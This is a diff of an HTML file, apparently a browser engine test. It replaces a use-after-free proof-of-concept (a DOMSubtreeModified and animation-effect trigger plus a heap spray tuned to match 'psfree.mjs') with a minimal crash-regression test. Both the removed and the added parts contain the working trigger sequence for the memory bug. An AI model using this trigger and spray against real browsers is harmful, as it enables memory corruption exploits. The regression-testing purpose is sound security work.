@@ -84,166 +84,46 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.
     </script>
 </html> -->
 
-<!DOCTYPE html>
 <html>
 <head>
-  <style>
-    @keyframes keyframes {}
-    cite { animation: keyframes 100ms; }
-  </style>
+<style>
+
+@keyframes keyframes {}
+
+cite { animation: keyframes 100ms }
+
+</style>
 </head>
 <body onload="main()">
-  <div id="status">Loading...</div>
-  <pre id="console"></pre>
-  <button id="trigger">Trigger PoC</button>
-  <p>PASS if UAF is detected or test doesn't crash</p>
-  <script>
-    // Utility functions
-    function log(message) {
-      const consoleDiv = document.getElementById('console');
-      consoleDiv.textContent += message + '\n';
-    }
 
-    function sleep(ms) {
-      return new Promise((resolve) => setTimeout(resolve, ms));
-    }
+<object type="image/png">
+    <cite></cite>
+    <dl hidden></dl>
+</object>
 
-    // Heap spray parameters
-    const num_reuses = 30000;
-    const ssv_len = 0x50; // Match psfree.mjs
-    const views = [];
-    const MAX_ATTEMPTS = 10;
-    let attemptCount = 0;
+<script>
 
-    async function prepareDOM() {
-      // Remove existing object to avoid conflicts
-      const existingObject = document.querySelector('#target-object');
-      if (existingObject) {
-        log('Removing existing object');
-        existingObject.remove();
-      }
+if (window.testRunner)
+    window.testRunner.dumpAsText();
 
-      // Create new DOM elements
-      const object = document.createElement('object');
-      object.type = 'image/png';
-      object.id = 'target-object';
-      const cite = document.createElement('cite');
-      cite.id = 'target-cite';
-      const dl = document.createElement('dl');
-      dl.id = 'target-dl';
-      dl.hidden = true;
-      object.appendChild(cite);
-      object.appendChild(dl);
-      document.body.appendChild(object);
-      log('Created new object, cite, and dl');
-      return { object, cite, dl };
-    }
+const object = document.querySelector("object");
+const cite = document.querySelector("cite");
+const dl = document.querySelector("dl");
 
-    async function attemptUAF() {
-      const { object, cite, dl } = await prepareDOM();
-      const status = document.getElementById('status');
-      attemptCount++;
-      log(`Attempt #${attemptCount}: Initiating UAF...`);
-      status.textContent = `Attempt #${attemptCount} in progress...`;
+function main() {
+    object.addEventListener("DOMSubtreeModified", subtreeModified);
+    object.data = "x";
+    cite.style.animationIterationCount = "infinite";
+}
 
-      try {
-        // Add event listener
-        object.addEventListener('DOMSubtreeModified', subtreeModified);
-        log('Added DOMSubtreeModified listener');
+function subtreeModified() {
+    const animation = cite.getAnimations()[0];
+    object.width = "1em";
+    object.codeBase;
+    animation.effect = new KeyframeEffect(dl, { });
+}
 
-        // Trigger animation and data change
-        cite.style.animationIterationCount = 'infinite';
-        log('Set animation to infinite');
-        object.data = 'x';
-        log('Set object.data to "x"');
-
-        // Wait briefly
-        await sleep(5);
-      } catch (error) {
-        log(`Error in attemptUAF: ${error.message}`);
-        status.textContent = 'Error occurred';
-        object.remove();
-        throw error;
-      }
-
-      async function subtreeModified() {
-        try {
-          log('DOM subtree modified, attempting UAF...');
-          const animation = cite.getAnimations()[0];
-          if (!animation) {
-            log('No animation found, retrying...');
-            object.remove();
-            return;
-          }
-
-          // Trigger potential UAF
-          object.width = '1em';
-          log('Set object.width to 1em');
-          object.codeBase; // Access deprecated property
-          log('Accessed object.codeBase');
-
-          // Aggressive heap spray
-          log('Performing heap spray...');
-          for (let i = 0; i < 500; i++) {
-            new Uint8Array(1024 * 1024);
-          }
-          for (let i = 0; i < num_reuses; i++) {
-            const view = new Uint8Array(new ArrayBuffer(ssv_len));
-            view[0] = 0x41;
-            views.push(view);
-          }
-
-          // Change animation effect
-          animation.effect = new KeyframeEffect(dl, {});
-          log('Changed animation effect to target dl');
-
-          // Check for UAF
-          log('Checking for UAF memory reuse...');
-          for (let i = 0; i < views.length; i++) {
-            const view = views[i];
-            if (view[0] !== 0x41) {
-              log(`UAF detected at view index: ${i}`);
-              status.textContent = 'UAF detected!';
-              return;
-            }
-          }
-
-          log('No UAF detected in this attempt');
-          status.textContent = 'No UAF detected';
-        } catch (error) {
-          log(`Error in subtreeModified: ${error.message}`);
-          status.textContent = 'Error occurred';
-        } finally {
-          object.remove();
-          views.length = 0;
-        }
-      }
-    }
-
-    async function main() {
-      const trigger = document.getElementById('trigger');
-      trigger.addEventListener('click', async () => {
-        log('Starting PoC...');
-        const status = document.getElementById('status');
-        status.textContent = 'Running PoC...';
-
-        for (let i = 0; i < MAX_ATTEMPTS; i++) {
-          try {
-            await attemptUAF();
-            if (document.getElementById('status').textContent === 'UAF detected!') {
-              break;
-            }
-            await sleep(100);
-          } catch (error) {
-            log(`Attempt ${attemptCount} failed: ${error.message}`);
-            if (attemptCount >= MAX_ATTEMPTS) {
-              status.textContent = 'Failed after max attempts';
-              alert('Failed to achieve UAF after maximum attempts');
-            }
-          }
-        }
-      });
-    }
-  </script>
+</script>
+<p>PASS if this test doesn't crash</p>
 </body>
 </html>
